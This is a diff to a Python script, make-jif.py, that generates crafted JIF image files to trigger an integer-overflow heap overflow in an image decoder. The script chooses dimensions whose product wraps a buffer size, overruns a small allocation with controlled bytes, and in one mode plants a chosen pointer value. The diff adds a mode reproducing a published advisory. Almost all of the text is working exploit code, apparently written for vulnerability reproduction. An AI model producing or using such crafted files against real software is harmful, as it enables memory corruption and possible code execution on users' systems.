@@ -5,29 +5,36 @@ len=33025, height=65026 -> len*height = 0x80000002; with the graphics
 control extension's transparent index, alpha doubling wraps data_size to 4
 while the pinned zs.avail_out stays 0x80000002 (2147483650). The zlib stream
 inflates to 40 chosen bytes, enough to pass the 4-byte `indexes` allocation
-and reach an adjacent live object.
+and reach an adjacent live object. The `published` mode uses the advisory's
+product 45771*46918 = 0x80000082, whose alpha-doubled data_size is 260.
 
-Usage: make-jif.py OUT (bytes HEXBYTE | ptr)
+Usage: make-jif.py OUT (bytes HEXBYTE | ptr | published HEXBYTE | safe HEXBYTE)
 """
 import struct
 import sys
 import zlib
 
 LEN, HEIGHT = 33025, 65026
-assert LEN * HEIGHT == 0x80000002
-assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4
-
 out, kind = sys.argv[1], sys.argv[2]
 if kind == "safe":
     LEN, HEIGHT = 4, 4
     plain = bytes([int(sys.argv[3], 16)]) * 16
 elif kind == "bytes":
     plain = bytes([int(sys.argv[3], 16)]) * 40
+elif kind == "published":
+    LEN, HEIGHT = 45771, 46918
+    plain = bytes([int(sys.argv[3], 16)]) * 324
 elif kind == "ptr":
     chosen = struct.pack("<Q", 0x00007F0000414243)
     plain = b"\x4d" * 32 + chosen + b"\x4d" * 8
 else:
     raise SystemExit("unknown mode")
+if kind in ("bytes", "ptr"):
+    assert LEN * HEIGHT == 0x80000002
+    assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4
+elif kind == "published":
+    assert LEN * HEIGHT == 0x80000082
+    assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 260
 gce = b"" if kind == "safe" else b"\x21\xf9\x04\x01\x00\x00\x00\x00"
 z = zlib.compress(plain, 9)
 chunks = b"".join(bytes([len(z[i:i + 255])]) + z[i:i + 255]
